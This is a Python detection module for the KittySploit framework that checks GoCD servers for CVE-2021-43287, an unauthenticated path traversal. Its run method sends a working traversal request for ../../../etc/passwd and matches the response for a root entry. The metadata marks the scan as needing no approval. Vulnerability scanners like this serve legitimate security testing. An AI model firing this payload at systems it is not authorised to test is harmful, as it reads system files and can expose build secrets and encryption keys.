#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GoCD contains a critical information disclosure vulnerability whose exploitation allows unauthenticated attack."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Pre-Auth Takeover of Build Pipelines in GoCD Detection',
        'description': 'GoCD contains a critical information disclosure vulnerability whose exploitation allows unauthenticated attackers to leak configuration information including build secrets and encryption keys.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'go', 'lfi', 'gocd', 'thoughtworks', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://attackerkb.com/assessments/9101a539-4c6e-4638-a2ec-12080b7e3b50',
            'https://blog.sonarsource.com/gocd-pre-auth-pipeline-takeover',
            'https://twitter.com/wvuuuuuuuuuuuuu/status/1456316586831323140',
            'https://www.gocd.org/releases/#21-3-0',
            'https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c',
        ],
        'cve': 'CVE-2021-43287',
    }

    def run(self):
        r = self.http_request(method="GET", path='/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Pre-Auth Takeover of Build Pipelines in GoCD detected",
                path='/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../etc/passwd',
            )
            return True
        return False

